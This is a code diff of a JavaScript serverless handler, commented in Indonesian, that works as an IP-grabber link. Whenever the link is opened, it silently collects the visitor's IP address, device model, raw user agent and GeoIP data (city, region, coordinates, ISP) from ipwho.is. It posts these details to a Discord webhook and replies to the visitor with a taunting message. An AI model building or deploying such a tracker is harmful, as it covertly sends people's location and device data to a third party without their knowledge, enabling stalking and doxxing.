@@ -10,31 +10,38 @@ export default async function handler(req, res) {
   
   const userAgentRaw = req.headers['user-agent'] || 'unknown';
   
-  // === TANPA LIST - AMBIL LANGSUNG DARI USER AGENT ===
-  // Device Type: deteksi sederhana tanpa list
+  // === DEVICE TYPE (deteksi sederhana) ===
   let deviceType = 'Desktop';
   const uaLower = userAgentRaw.toLowerCase();
   if (uaLower.includes('mobile')) deviceType = 'Mobile';
   if (uaLower.includes('tablet') || uaLower.includes('ipad')) deviceType = 'Tablet';
   
-  // Device Model: EKSTRAK LANGSUNG dari User Agent (tanpa list mapping)
-  // Ini akan mengambil kode/angka/model apapun yang ada di user agent
-  let deviceModel = 'Unknown';
+  // === DEVICE MODEL (ambil dari User Agent apa adanya, tanpa rekayasa) ===
+  let deviceModel = 'Tidak terdeteksi';
   
-  // Cari pola umum model device di user agent
-  // Pola 1: Huruf besar + angka + huruf besar/angka (contoh: SM-G998B, iPhone14,2)
-  const modelPattern1 = userAgentRaw.match(/[A-Z]{2,}-?[A-Z0-9]+[0-9][A-Z0-9]*/i);
-  if (modelPattern1) deviceModel = modelPattern1[0];
+  // Coba ekstrak model dari user agent (seadanya)
+  const patterns = [
+    /SM-[A-Z0-9]+/i,           // Samsung
+    /iPhone[0-9,]+/i,           // iPhone
+    /Pixel\s[0-9]/i,            // Google Pixel
+    /; ([^;)]+?)\)/,            // Generic ambil setelah titik koma
+  ];
   
-  // Pola 2: Angka 8-10 digit (contoh: 21091116AC untuk Redmi)
-  const modelPattern2 = userAgentRaw.match(/[0-9]{8,}[A-Z]{0,2}/i);
-  if (deviceModel === 'Unknown' && modelPattern2) deviceModel = modelPattern2[0];
+  for (let pattern of patterns) {
+    const match = userAgentRaw.match(pattern);
+    if (match) {
+      deviceModel = match[0];
+      break;
+    }
+  }
   
-  // Pola 3: Setelah kata "Android" sampai sebelum tanda kurung/titik koma
-  const androidMatch = userAgentRaw.match(/Android\s+[0-9.]+;\s+([^;)]+)/);
-  if (deviceModel === 'Unknown' && androidMatch) deviceModel = androidMatch[1].trim();
+  // Kalau masih "Tidak terdeteksi", ambil kata terakhir setelah 'Android' atau ';'
+  if (deviceModel === 'Tidak terdeteksi') {
+    const lastResort = userAgentRaw.match(/Android\s+[0-9.]+;\s+([^;)]+)/);
+    if (lastResort) deviceModel = lastResort[1].trim();
+  }
   
-  // === Ambil info lengkap dari ipwho.is ===
+  // === AMBIL DATA LENGKAP DARI ipwho.is ===
   let ipwhoisData = null;
   try {
     const controller = new AbortController();
@@ -46,21 +53,31 @@ export default async function handler(req, res) {
     console.error('GeoIP error:', err.message);
   }
   
-  // === KIRIM KE DISCORD (SEMUA INFO ASLI) ===
+  // === KIRIM KE DISCORD ===
   let discordContent = `**🔔 ADA YANG BUKA LINK!**\n\n` +
     `**🌐 IP:** \`${ip}\`\n` +
     `**📱 Device Type:** ${deviceType}\n` +
-    `**📲 Device Model (Asli):** \`${deviceModel}\`\n` +
+    `**📲 Device Model (dari User Agent):** \`${deviceModel}\`\n` +
     `**🕒 Waktu:** ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n`;
   
-  // Kirim USER AGENT LENGKAP (sumber semua data asli)
-  discordContent += `**📱 USER AGENT LENGKAP (Sumber Data Asli):**\n` +
-    `\`\`\`\n${userAgentRaw}\n\`\`\`\n`;
-  
+  // Info dari ipwho.is (flag, city, region, country, lat, long)
   if (ipwhoisData && ipwhoisData.success) {
-    discordContent += `**📍 DATA LENGKAP IPWHOIS:**\n` +
-      `\`\`\`json\n${JSON.stringify(ipwhoisData, null, 2)}\n\`\`\``;
+    const flag = ipwhoisData.flag?.emoji || '';
+    discordContent += `**📍 LOKASI DARI IPWHOIS:**\n` +
+      `🇮🇩 **Negara:** ${ipwhoisData.country || 'Unknown'} ${flag}\n` +
+      `🗺️ **Region:** ${ipwhoisData.region || 'Unknown'}\n` +
+      `🏙️ **Kota:** ${ipwhoisData.city || 'Unknown'}\n` +
+      `📌 **Koordinat:** ${ipwhoisData.latitude || '?'}, ${ipwhoisData.longitude || '?'}\n`;
+    
+    if (ipwhoisData.connection?.isp) {
+      discordContent += `\n**🌍 ISP:** ${ipwhoisData.connection.isp}\n`;
+    }
+  } else {
+    discordContent += `⚠️ **Gagal mengambil data lokasi**\n`;
   }
+  
+  // Kirim User Agent raw sebagai bukti
+  discordContent += `\n**📱 USER AGENT RAW:**\n\`\`\`\n${userAgentRaw}\n\`\`\``;
   
   // Kirim ke Discord
   fetch(DISCORD_WEBHOOK, {
@@ -73,4 +90,4 @@ export default async function handler(req, res) {
   res.status(200).json({
     message: "SIRI JELEK CUY"
   });
-                                 }
+    }
